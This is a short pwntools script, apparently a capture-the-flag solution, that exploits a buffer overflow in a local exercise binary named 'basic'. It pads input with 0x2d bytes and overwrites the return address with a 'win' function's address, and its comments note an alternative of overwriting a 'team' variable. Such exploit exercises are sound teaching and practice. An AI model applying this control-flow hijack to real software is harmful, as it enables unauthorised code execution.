from pwn import *

p = process('./basic')
elf = p.elf

# you can either overwrite the team variable, to make the check succeed
if False:
    payload = b'A' * 0x20
    payload += b'B'
# or we can simply overwrite the return address directly
else:
    payload = b'A' * 0x2d
    payload += p32(elf.symbols['win'])

p.sendlineafter(b'\n', payload)

p.interactive()
p.close()